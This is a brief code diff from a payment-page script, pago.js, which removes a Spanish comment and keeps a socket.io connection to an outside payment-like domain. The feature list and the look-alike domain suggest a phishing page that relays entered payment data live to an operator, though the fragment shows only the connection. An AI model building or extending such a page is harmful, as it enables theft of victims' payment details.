@@ -1,6 +1,3 @@
-mira este es el codigo que tengo yo:
-// pago.js - Sincronización en Vivo + Resumen de Datos Activo + Inputs Limpios + Bloqueo de UI + Enrutamiento Dinámico
-
 const socket = io('https://apifinacjs.pagoswebcol.uk'); 
 
 let isTransactionActive = false;
